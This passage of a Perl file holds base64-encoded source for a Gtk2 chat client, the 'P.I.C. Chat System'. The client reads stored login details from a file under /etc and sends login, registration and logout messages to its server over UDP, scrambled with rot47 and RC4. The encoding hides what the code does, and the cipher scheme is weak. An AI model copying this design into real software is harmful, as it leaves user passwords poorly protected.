UgKSB7JHggPSAwIGlmICsrJHggPiAyNTU7JHkgLT0gMjU2IGlmICgkeSArPSAkc3RhdGVbJHhdKSA+IDI1NTsKQHN0YXRlWyR4LCAkeV0gPSBAc3RhdGVbJHksICR4XTsgJF8gXj0gJHN0YXRlWyggJHN0YXRlWyR4XSArICRzdGF0ZVskeV0gKSAlIDI1Nl07fQpzdWJzdHIoJG1lc3NhZ2UsICRwaWVjZSAqICRNQVhfQ0hVTktfU0laRSwgJE1BWF9DSFVOS19TSVpFKSA9IHBhY2sgIkMqIiwgQG1lc3NhZ2U7fQppZiAoJHNlbGYpIHskc2VsZi0+e3N0YXRlfSA9IFxAc3RhdGU7ICRzZWxmLT57eH0gPSAkeDskc2VsZi0+e3l9ID0gJHk7fSRtZXNzYWdlO30Kc3ViIFNldHVwIHsgbXkgQGsgPSB1bnBhY2soICdDKicsIHNoaWZ0ICk7bXkgQHN0YXRlID0gMC4uMjU1O215ICR5ID0gMDtmb3IgbXkgJHggKDAuLjI1NSkgewokeSA9ICggJGtbJHggJSBAa10gKyAkc3RhdGVbJHhdICsgJHkgKSAlIDI1NjtAc3RhdGVbJHgsICR5XSA9IEBzdGF0ZVskeSwgJHhdO313YW50YXJyYXkgPyBAc3RhdGUgOiBcQHN0YXRlO30KCkJFR0lOIHsgcHVzaCBASU5DLCcuJzsgfSAKbXkgJG1lID0gZ2V0bG9naW47CgpzdWIgZGVjcnkgKCQpeyBsb2NhbCgkXlcpID0gMDtteSAkc3RyID0gc2hpZnQ7bXkgJHJlcyA9ICIiOwokc3RyID1+IHRyfEEtWmEtejAtOSs9L3x8Y2Q7JHN0ciA9fiBzLz0rJC8vOyAgJHN0ciA9fiB0cnxBLVphLXowLTkrL3wgLV98OyAgCndoaWxlICgkc3RyID1+IC8oLnsxLDYwfSkvZ3MpIHtteSAkbGVuID0gY2hyKDMyICsgbGVuZ3RoKCQxKSozLzQpOyAKJHJlcyAuPSB1bnBhY2soInUiLCAkbGVuIC4gJDEgKTsgfSRyZXM7fQoKc3ViIGNyeSAoJDskKXsgbXkgJHJlcyA9ICIiOyBteSAkZW9sID0gJF9bMV07ICRlb2wgPSAiXG4iIHVubGVzcyBkZWZpbmVkICRlb2w7CnBvcygkX1swXSkgPSAwOyB3aGlsZSAoJF9bMF0gPX4gLyguezEsNDV9KS9ncykgeyRyZXMgLj0gc3Vic3RyKHBhY2soJ3UnLCAkMSksIDEpO2Nob3AoJHJlcyk7fQokcmVzID1+IHRyfGAgLV98QUEtWmEtejAtOSsvfDsgIG15ICRwYWRkaW5nID0gKDMgLSBsZW5ndGgoJF9bMF0pICUgMykgJSAzOwokcmVzID1+IHMvLnskcGFkZGluZ30kLyc9JyB4ICRwYWRkaW5nL2UgaWYgJHBhZGRpbmc7aWYgKGxlbmd0aCAkZW9sKSB7CiRyZXMgPX4gcy8oLnsxLDc2fSkvJDEkZW9sL2c7fSAkcmVzO30KCm15ICRjb21ib2JveDsgbXkgJG1haW52aWV3OyBteSAkbWFpbnZpZXcyOyAKbXkgJG1haW52aWV3MzsgbXkgJG1haW52aWV3NDsgbXkgJG1haW52aWV3NTsgbXkgJG1haW52aWV3NjsgbXkgJG1haW5fc3RhdF9mcmFtZTM7Cm15ICRtYWluX3N0YXRfZnJhbWU0OyAKbXkgJHR2aWV3MyA9IEd0azI6OlRleHRWaWV3LT5uZXcoKTsKbXkgJGJ1ZmZFeCA9ICR0dmlldzMtPmdldF9idWZmZXIoKTsKbXkgJG1zZ19zZW5kMjsgbXkgJHF1YWRjbWQ7IG15ICR0bWFjaGluZXM7Cm15ICRtYWluX3N0YXRfZnJhbWVfYWZ0ZXJfbmV4dDQ7Cm15ICR0b3RhbF9tYWNoaW5lcyA9IEd0azI6OkxhYmVsLT5uZXcoKTsgbXkgJHRvdGFsX21hY2hpbmVzMiA9IEd0azI6OkxhYmVsLT5uZXcoKTsKbXkgJHRvdGFsX21hY2hpbmVzMyA9IEd0azI6OkxhYmVsLT5uZXcoKTsgbXkgJHRvdGFsX21hY2hpbmVzNCA9IEd0azI6OkxhYmVsLT5uZXcoKTsKbXkgJE5ld1N3OyBteSAkTmV3VFZpZXcgPSBHdGsyOjpUZXh0Vmlldy0+bmV3KCk7IG15ICROZXdTdzI7Cm15ICRlbnRfc2VuZCA9IEd0azI6OkVudHJ5LT5uZXc7IG15ICRVbHRpbWF0ZUJ1ZmZFeCA9ICROZXdUVmlldy0+Z2V0X2J1ZmZlcigpOwpteSAkTWFpbkVudHJ5ID0gR3RrMjo6RW50cnktPm5ldygpOyBteSAkTmV3QnVmZm9yID0gJE5ld1RWaWV3LT5nZXRfYnVmZmVyKCk7Cm15ICRVc2VyV2luZG93U1c7IG15ICRVc2VyV2luZG93VFZpZXcgPSBHdGsyOjpUZXh0Vmlldy0+bmV3KCk7IG15ICRQcml2YXRlRW50cnkgPSBHdGsyOjpFbnRyeS0+bmV3KCk7Cm15ICRidWZmID0gJFVzZXJXaW5kb3dUVmlldy0+Z2V0X2J1ZmZlcigpOyBteSAkTmV3VFZpZXcyID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOyBteSAkTmV3QnVmZm9yMiA9ICROZXdUVmlldzItPmdldF9idWZmZXIoKTsKbXkgJG51bWJlcl9vZl91c2VyczsgbXkgJHVzZXJzX2NvbnRhaW5lcjsgbXkgJHhheGE7IG15ICR0YWdfc2VuZDsgbXkgJFJDNFZhbHVlOwpteSAkZGJob3N0ID0gImxvY2FsaG9zdCI7IG15ICRkYnVzZXIgPSAicm9vdCI7IG15ICRkYnBhc3MgPSAiIjsgbXkgJGRiID0gInVzZXJzIjsgbXkgJHRhYmxlID0gInN0YXRzIjsKIAokYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIlAuSS5DLiBNYW5hZ2VtZW50IFN5c3RlbSBzdGFydGVkISBcbiIpOwoKbXkgJHRyZWVfc3RvcmUgPSBHdGsyOjpUcmVlU3RvcmUtPm5ldyhxdy9HbGliOjpTdHJpbmcvKTsKbXkgJHRyZWVfdmlldyA9IEd0azI6OlRyZWVWaWV3LT5uZXcoJHRyZWVfc3RvcmUpOwpteSAkdHJlZV9jb2x1bW4gPSBHdGsyOjpUcmVlVmlld0NvbHVtbi0+bmV3KCk7CgpteSAgJE1BWExFTiA9IDEwMjQ7Cm15ICRwcm90byA9ICd1ZHAnOwpteSAgCSR0YWdfcmVjZWl2ZSAJPSAnbXJaJzsKJHw9MTsKCm15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KExvY2FsUG9ydCA9PiAkRVJURVBvcnQsIFByb3RvID0+ICRwcm90bykgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJTb2NrZXQgRXJyb3I6ICRAICIpOwpHdGsyOjpIZWxwZXItPmFkZF93YXRjaCAoIGZpbGVubyAkc29jaywgJ2luJyxzdWJ7IG15ICgkZmQsJGNvbmRpdGlvbiwkZmgpID0gQF87XCZ3YXRjaF9jYWxsYmFjaygkZmgsJE5ld1RWaWV3KTt9LCRzb2NrKTsKCkd0azI6OlJjLT5wYXJzZSAoJy91c3Ivc2hhcmUvdGhlbWVzL1F0L2d0ay0yLjAvZ3RrcmMnKTsKJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJMaXN0ZW5uaW5nIG9uIHBvcnQgJEVSVEVQb3J0IGFuZCAkUkVHX1BPUlQgIGZvciBwcm9jZXNzaW5nIGNvbm5lY3Rpb25zIHdpdGggc2VydmVyLiBcbiIpOwoKCm15ICR3aW5kb3cgPSBHdGsyOjpXaW5kb3ctPm5ldygndG9wbGV2ZWwnKTsKJHdpbmRvdy0+c2V0X3Jlc2l6YWJsZSgxKTsKJHdpbmRvdy0+c2V0X2ljb25fZnJvbV9maWxlICgiZ2xvYmUucG5nIik7CiR3aW5kb3ctPnNldF9wb3NpdGlvbignY2VudGVyX2Fsd2F5cycpOwokd2luZG93LT5zaWduYWxfY29ubmVjdCgnZGVsZXRlX2V2ZW50JyA9PiBzdWIgewpteSAkc2VuZF9zb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdClvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkNyZWF0aW5nIHNvY2tldDogXG4kIVxuIik7Cm15ICRlbmNvZGVkMCA9IHJvdDQ3KCJsb2dfb2YkSiR0YWdfc2VuZCIpOwpteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzZW5kX3NvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7IApleGl0O30pOwoKCiAgJHdpbmRvdy0+c2V0X2JvcmRlcl93aWR0aCg1KTsKICAkd2luZG93LT5zZXRfdGl0bGUoIiBQLkkuQyBDaGF0IFN5c3RlbSAiKTsKICBteSAoJHZib3gpID0gJnJldF92Ym94KCk7CiAgJHdpbmRvdy0+YWRkKCR2Ym94KTsKICAkd2luZG93LT5zaG93KCk7CgpvcGVuKEYyLCIvZXRjLy5QLkkuQ19EQVRBLnR4dCIpIHx8ICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiTm8gZGF0YSEgSGF2ZSB5b3UgcmVnaXN0ZXJlZD9cbiIpOyAKbXkgJGRldGFpbHMgPSBkZWNyeSg8RjI+KTsKQGxvZ2luX3Bhc3MgPSBzcGxpdCgvJEovLCAkZGV0YWlscyk7CiRyb290bG9naW4gPSAkbG9naW5fcGFzc1swXTsgJHJvb3RwYXNzd2QgPSAkbG9naW5fcGFzc1sxXTsKJHRhZ19zZW5kID0gJGxvZ2luX3Bhc3NbMF07Cm15ICRtc2dfc2VuZCA9ICJhdXRoJEoiLiRyb290bG9naW4uIiRKIi4kcm9vdHBhc3N3ZC4iJEoiLiIwIjsKbXkgJHNlbmRfc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsClBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJG1zZ19zZW5kIik7Cm15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKJHNlbmRfc29jay0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhXG4iKTsgCgpHdGsyLT5tYWluKCk7
";

my $part3 = "
CnN1YiBNYWluQm94IHsgbXkgJHZib3ggPSBHdGsyOjpWQm94LT5uZXcoMCwwKTsKCm15ICRtYWluYm94ID0gR3RrMjo6SEJveC0+bmV3KDAsMCk7Cm15ICRidG5fcXVpdCA9IEd0azI6OkJ1dHRvbi0+bmV3X2Zyb21fc3RvY2soJ2d0ay1xdWl0Jyk7CiRidG5fcXVpdC0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKbXkgJHNlbmRfc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsClBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygibG9nX29mJEptZSIpOwpteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzZW5kX3NvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7IApleGl0Owp9KTsKCm15ICRidG5fcXVpY2tfcmVnID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygnUmVnaXN0ZXInKTsKJGJ0bl9xdWlja19yZWctPnNpZ25hbF9jb25uZWN0KCJjbGlja2VkIiA9PnN1YiB7CiRtc2dfc2VuZCA9ICRNYWluRW50cnktPmdldF90ZXh0OwpteSBAY2hlY2sgPSBzcGxpdCgvJEovLCAkbXNnX3NlbmQpOwppZihsZW5ndGgoJGNoZWNrWzBdKSA8IDMpe2dvdG8gV3JvbmdOYW1lO30KaWYobGVuZ3RoKCRjaGVja1sxXSkgPCAzKXtnb3RvIFdyb25nUGFzczt9CiRNYWluRW50cnktPnNldF90ZXh0KCIiKTsKJE1haW5FbnRyeS0+Z3JhYl9mb2N1czsKbXkgJG1zZ19zZW5kX2FsbCA9ICJyZWckSiIuJG1zZ19zZW5kOwppZiAoJG1zZ19zZW5kX2FsbCAhfiBtL15ccyokLyl7Cm15ICRzb2NrX3JlZyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsIFBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJG1zZ19zZW5kX2FsbCIpOyBteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzb2NrX3JlZy0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhIik7Cn0KV3JvbmdOYW1lOgokYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIlVzZXJOYW1lIHRvbyBzbWFsbCEgTWluaW11bSBsZW5ndGggaXMgMyBjaGFyYWN0ZXJzIVxuIik7Cldyb25nUGFzczoKJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJQYXNzd29yZCB0b28gc21hbGwhIE1pbmltdW0gbGVuZ3RoIGlzIDMgY2hhcmFjdGVycyFcbiIpOwp9KTsgCgpteSAkYnRuX3F1aWNrX2xvZ2luID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygnTG9naW4nKTsKJGJ0bl9xdWlja19sb2dpbi0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKJG1zZ19zZW5kID0gJE1haW5FbnRyeS0+Z2V0X3RleHQ7Cm15IEBjaGVjayA9IHNwbGl0KC8kSi8sICRtc2dfc2VuZCk7CmlmKGxlbmd0aCgkY2hlY2tbMF0pIDwgMyl7Z290byBXcm9uZ05hbWU7fQppZihsZW5ndGgoJGNoZWNrWzFdKSA8IDMpe2dvdG8gV3JvbmdQYXNzO30KJE1haW5FbnRyeS0+c2V0X3RleHQoIiIpOwokTWFpbkVudHJ5LT5ncmFiX2ZvY3VzOwpteSAkbXNnX3NlbmRfYWxsID0gImF1dGgkSiIuJG1zZ19zZW5kOwppZiAoJG1zZ19zZW5kX2FsbCAhfiBtL15ccyokLyl7Cm15ICRzb2NrX3JlZyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsIFBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJG1zZ19zZW5kX2FsbCIpOyBteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzb2NrX3JlZy0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhIik7Cn0KV3JvbmdOYW1lOgokYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIlVzZXJOYW1lIHRvbyBzbWFsbCEgTWluaW11bSBsZW5ndGggaXMgMyBjaGFyYWN0ZXJzIVxuIik7Cldyb25nUGFzczoKJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJQYXNzd29yZCB0b28gc21hbGwhIE1pbmltdW0gbGVuZ3RoIGlzIDMgY2hhcmFjdGVycyFcbiIpOwp9KTsKCm15ICRidG5fcXVpY2tfcmVmX3ByaXYgPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCJDbGVhciBQcml2YXRlXG5DaGF0IFdpbmRvdyIpOwokYnRuX3F1aWNrX3JlZl9wcml2LT5zaWduYWxfY29ubmVjdCgiY2xpY2tlZCIgPT5zdWIgewpteSAkY2xlYXJidWZmZXIgPSAkTmV3VFZpZXcyLT5nZXRfYnVmZmVyOwokY2xlYXJidWZmZXItPmRlbGV0ZSgkY2xlYXJidWZmZXItPmdldF9zdGFydF9pdGVyLCAkY2xlYXJidWZmZXItPmdldF9lbmRfaXRlcik7CiROZXdUVmlldzItPnNldF9idWZmZXIoJGNsZWFyYnVmZmVyKTsKfSk7CgpteSAkYnRuX3F1aWNrX3JlZl9wdWIgPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCJDbGVhciBQdWJsaWNcbkNoYXQgV2luZG93Iik7CiRidG5fcXVpY2tfcmVmX3B1Yi0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKbXkgJGNsZWFyYnVmZmVyID0gJE5ld1RWaWV3LT5nZXRfYnVmZmVyOwokY2xlYXJidWZmZXItPmRlbGV0ZSgkY2xlYXJidWZmZXItPmdldF9zdGFydF9pdGVyLCAkY2xlYXJidWZmZXItPmdldF9lbmRfaXRlcik7CiROZXdUVmlldy0+c2V0X2J1ZmZlcigkY2xlYXJidWZmZXIpOwp9KTsKCm15ICRmcmFtZTIgPSBHdGsyOjpGcmFtZS0+bmV3KCJQcml2YXRlIENoYXQgV2luZG93Iik7CiRmcmFtZTItPnNldF9ib3JkZXJfd2lkdGgoNSk7CiROZXdTdzIgPSBHdGsyOjpTY3JvbGxlZFdpbmRvdy0+bmV3ICh1bmRlZiwgdW5kZWYpOwokTmV3U3cyLT5zZXRfc2hhZG93X3R5cGUgKCdldGNoZWQtb3V0Jyk7CiROZXdTdzItPnNldF9wb2xpY3kgKCdhdXRvbWF0aWMnLCAnYXV0b21hdGljJyk7CiROZXdTdzItPnNldF9zaXplX3JlcXVlc3QgKDYwMCwgMzAwKTsKJE5ld1N3Mi0+c2V0X2JvcmRlcl93aWR0aCg1KTsKCiROZXdUVmlldzItPnNldF9lZGl0YWJsZSgwKTsKJE5ld1RWaWV3Mi0+c2V0X2N1cnNvcl92aXNpYmxlICgwKTsKCiROZXdCdWZmb3IyLT5jcmVhdGVfbWFyayAoJ2VuZCcsICROZXdCdWZmb3IyLT5nZXRfZW5kX2l0ZXIsIDApOwokTmV3QnVmZm9yMi0+c2lnbmFsX2Nvbm5lY3QgKGluc2VydF90ZXh0ID0+IHN1YiB7CiROZXdUVmlldzItPnNjcm9sbF90b19tYXJrICgkTmV3QnVmZm9yMi0+Z2V0X21hcmsgKCdlbmQnKSwgMC4wLCAxLCAwLCAwLjUpO30pOwokTmV3QnVmZm9yMi0+Y3JlYXRlX3RhZyAoIm1yWCIsZm9yZWdyb3VuZCA9PiAicmVkIiwpOwkKJE5ld0J1ZmZvcjItPmNyZWF0ZV90YWcgKCJtcloiLGZvcmVncm91bmQgPT4gImJsdWUiLCk7CgpteSAkZnJhbWUgPSBHdGsyOjpGcmFtZS0+bmV3KCJQdWJsaWMgQ2hhdCBXaW5kb3ciKTsKJGZyYW1lLT5zZXRfYm9yZGVyX3dpZHRoKDUpOwokTmV3U3cgPSBHdGsyOjpTY3JvbGxlZFdpbmRvdy0+bmV3ICh1bmRlZiwgdW5kZWYpOwokTmV3U3ctPnNldF9zaGFkb3dfdHlwZSAoJ2V0Y2hlZC1vdXQnKTsKJE5ld1N3LT5zZXRfcG9saWN5ICgnYXV0b21hdGljJywgJ2F1dG9tYXRpYycpOwokTmV3U3ctPnNldF9zaXplX3JlcXVlc3QgKDYwMCwgMzAwKTsKJE5ld1N3LT5zZXRfYm9yZGVyX3dpZHRoKDUpOwoKJE5ld1RWaWV3LT5zZXRfZWRpdGFibGUoMCk7CiROZXdUVmlldy0+c2V0X2N1cnNvcl92aXNpYmxlICgwKTsKCiROZXdCdWZmb3ItPmNyZWF0ZV9tYXJrICgnZW5kJywgJE5ld0J1ZmZvci0+Z2V0X2VuZF9pdGVyLCAwKTsKJE5ld0J1ZmZvci0+c2lnbmFsX2Nvbm5lY3QgKGluc2VydF90ZXh0ID0+IHN1YiB7CiROZXdUVmlldy0+c2Nyb2xsX3RvX21hcmsgKCROZXdCdWZmb3ItPmdldF9tYXJrICgnZW5kJyksIDAuMCwgMSwgMCwgMC41KTt9KTsKJE5ld0J1ZmZvci0+Y3JlYXRlX3RhZyAoIm1yWCIsZm9yZWdyb3VuZCA9PiAicmVkIiwpOwkKJE5ld0J1ZmZvci0+Y3JlYXRlX3RhZyAoIm1yWiIsZm9yZWdyb3VuZCA9PiAiYmx1ZSIsKTsKCm15ICRzd2luZCA9IEd0azI6OlNjcm9sbGVkV2luZG93LT5uZXcgKHVuZGVmLCB1bmRlZik7CiRzd2luZC0+c2V0X3NoYWRvd190eXBlICgnZXRjaGVkLW91dCcpOwokc3dpbmQtPnNldF9wb2xpY3kgKCdhdXRvbWF0aWMnLCAnYXV0b21hdGljJyk7CiRzd2luZC0+c2V0X3NpemVfcmVxdWVzdCAoMjAwLCAxMDApOwokc3dpbmQtPnNldF9ib3JkZXJfd2lkdGgoNSk7CgokdHJlZV9jb2x1bW4tPnNldF90aXRsZSAoIlNlbGVjdCBVc2VyIHRvIFRhbGsiKTsKbXkgJHJlbmRlcmVyID0gR3RrMjo6Q2VsbFJlbmRlcmVyVGV4dC0+bmV3OwokdHJlZV9jb2x1bW4tPnBhY2tfc3RhcnQgKCRyZW5kZXJlciwgMCk7CiR0cmVlX2NvbHVtbi0+YWRkX2F0dHJpYnV0ZSgkcmVuZGVyZXIsIHRleHQgPT4gMCk7CiR0cmVlX3ZpZXctPmFwcGVuZF9jb2x1bW4gKCR0cmVlX2NvbHVtbik7Cm15ICR0cmVlc2VsZWN0aW9uID0gJHRyZWVfdmlldy0+Z2V0X3NlbGVjdGlvbjsKbXkgJGl0ZXJfY2hpbGQ7IG15ICRpdGVyOwoKbXkgJGJ0bl9zaG93X3VzZXJzID0gR3RrMjo6QnV0dG9uLT5uZXcoIl9VcGRhdGVcblVzZXIgTGlzdCEiKTsKJGJ0bl9zaG93X3VzZXJzLT5zaWduYWxfY29ubmVjdCgiY2xpY2tlZCIgPT4gc3ViIHsKbXkgJHNvY2szID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90bywgUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsIFBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3QpIDsKbXkgJGVuY29kZWQwID0gcm90NDcoInVTZV9SbGlTVCIuJEouIml3QU50Iik7Cm15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKJHNvY2szLT5zZW5kKCIkZW5jUkM0Iik7CgokdHJlZV9zdG9yZS0+Y2xlYXIgKCk7CiRpdGVyID0gJHRyZWVfc3RvcmUtPmFwcGVuZCh1bmRlZik7CiR0cmVlX3N0b3JlLT5zZXQgKCRpdGVyLDAgPT4gIlVzZXJzIik7CgpteSAkaW50OyBteSBAdXNlcnNUb3RhbCA9ICBzcGxpdCgvJEovLCAkeGF4YSk7CmZvcmVhY2ggKDEuLiRudW1iZXJfb2ZfdXNlcnMpewpteSAkZXggLj0gICR1c2Vyc1RvdGFsWyRpbnQrK107CiRpdGVyX2NoaWxkID0gJHRyZWVfc3RvcmUtPmFwcGVuZCgkaXRlcik7CmlmKGluZGV4KCRleCwgIm9ONG5EclVubjFOIikgPiAwKXsKbXkgJG9uID0gc3Vic3RyKCRleCwgMCwgLTExKTsKJHRyZWVfc3RvcmUtPnNldCAoJGl0ZXJfY2hpbGQsMCA9PiRvbi4iIFsrXSIpO30KZWxzaWYoaW5kZXgoJGV4LCAiMGZGX0wxbkUiKSA+IDApewpteSAkb2ZmID0gc3Vic3RyKCRleCwgMCwgLTgpOwokdHJlZV9zdG9yZS0+c2V0ICgkaXRlcl9jaGlsZCwwID0+JG9mZi4iIFstXSIpOyB9Cn19KTsKCm15ICRmcmFtID0gR3RrMjo6RnJhbWUtPm5ldygpOyBteSAkSEJCb3ggPSBHdGsyOjpWQm94LT5uZXcoMCwwKTsKbXkgJHNvbWVCb3ggPSBHdGsyOjpWQm94LT5uZXcoKTsgJHNvbWVCb3gtPmFkZCgkYnRuX3Nob3dfdXNlcnMpOwokc29tZUJveC0+YWRkKCRidG5fcXVpY2tfcmVnKTsgJHNvbWVCb3gtPmFkZCgkYnRuX3F1aWNrX2xvZ2luKTsgCiRzb21lQm94LT5hZGQoJGJ0bl9xdWlja19yZWZfcHJpdik7ICRzb21lQm94LT5hZGQoJGJ0bl9xdWlja19yZWZfcHViKTsgCiROZXdTdy0+YWRkKCROZXdUVmlldyk7JGZyYW1lLT5hZGQoJE5ld1N3KTsgJHN3aW5kLT5hZGQoJHRyZWVfdmlldyk7ICRmcmFtLT5hZGQoJHN3aW5kKTsKJE5ld1N3Mi0+YWRkKCROZXdUVmlldzIpOyAkZnJhbWUyLT5hZGQoJE5ld1N3Mik7IAokSEJCb3gtPmFkZCgkZnJhbWUpOyAkSEJCb3gtPmFkZCgkZnJhbWUyKTsKCiRtYWluYm94LT5wYWNrX3N0YXJ0KCRIQkJveCwxLDEsNCk7CiRtYWluYm94LT5wYWNrX3N0YXJ0KCRmcmFtLDEsMSw0KTsKJG1haW5ib3gtPmFkZCgkc29tZUJveCk7CiR2Ym94LT5wYWNrX3N0YXJ0KCRtYWluYm94LDEsMSw0KTsKbXkgJGhib3ggPSBHdGsyOjpIQm94LT5uZXcoMCw1KTsKJHZib3gtPnNldF9mb2N1c19jaGlsZCgkaGJveCk7JHZib3gtPnNob3dfYWxsKCk7CnJldHVybiAkdmJveDsKfQo=
";
my $part4 = "
CnN1YiByZXRfdmJveCB7CgpteSAkdmJveCA9IEd0azI6OlZCb3gtPm5ldygwLDApOyAKbXkgJGZyYW1lID0gR3RrMjo6RnJhbWUtPm5ldygiJHRhZ19zZW5kIik7CiRmcmFtZS0+c2V0X2JvcmRlcl93aWR0aCg1KTsKCiAgCW15ICRtZW51X2VkaXQgPSBHdGsyOjpNZW51LT5uZXcoKTsKICAJJG1lbnVfZWRpdC0+YXBwZW5kKEd0azI6OlRlYXJvZmZNZW51SXRlbS0+bmV3KTsKICAJCW15ICRtZW51X2l0ZW1fY3V0ID0gR3RrMjo6SW1hZ2VNZW51SXRlbS0+bmV3X2Zyb21fc3RvY2sgKCdndGstYWJvdXQnLCB1bmRlZik7CiAgCQkkbWVudV9pdGVtX2N1dC0+c2lnbmFsX2Nvbm5lY3QoJ2FjdGl2YXRlJyA9PiBzdWIgeyAmQWJvdXQoKTsgfSk7CiAgCQkkbWVudV9lZGl0LT5hcHBlbmQoJG1lbnVfaXRlbV9jdXQpOwogIAkJJG1lbnVfZWRpdC0+YXBwZW5kKEd0azI6OlNlcGFyYXRvck1lbnVJdGVtLT5uZXcoKSk7CiAgCQlteSAkbWVudV9pdGVtX2ltYWdlID0gR3RrMjo6SW1hZ2VNZW51SXRlbS0+bmV3X2Zyb21fc3RvY2sgKCdndGstcXVpdCcsIHVuZGVmKTsKICAJCSRtZW51X2l0ZW1faW1hZ2UtPnNpZ25hbF9jb25uZWN0KCdhY3RpdmF0ZScgPT4gc3ViIHsKCQlteSAkc2VuZF9zb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKCQlQZWVyQWRkciAgPT4gJHNlcnZlcl9ob3N0KW9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiQ3JlYXRpbmcgc29ja2V0OiBcbiQhXG4iKTsKCQlteSAkZW5jb2RlZDAgPSByb3Q0NygibG9nX29mJEokdGFnX3NlbmQiKTsKCQlteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CgkJJHNlbmRfc29jay0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhXG4iKTsgCgkJZXhpdDsKCQl9KTsKICAJCSRtZW51X2VkaXQtPmFwcGVuZCgkbWVudV9